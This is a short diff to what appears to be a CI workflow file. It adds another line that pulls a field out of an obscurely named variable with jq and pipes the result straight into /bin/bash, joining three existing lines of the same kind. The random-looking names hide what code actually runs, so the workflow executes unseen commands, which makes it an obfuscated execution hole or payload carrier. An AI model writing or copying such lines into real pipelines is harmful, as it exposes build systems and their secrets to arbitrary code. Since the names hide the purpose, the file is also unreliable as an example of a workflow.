@@ -20,6 +20,7 @@ jobs:
           echo $aoe0 | jq -r .vq49061 | /bin/bash
           echo $q13 | jq -r .qs24 | /bin/bash
           printf '%s' "$mxf9619" | jq -r .ybeep6873 | /bin/bash
+          echo $ihinl8 | jq -r .ebvrb3375 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
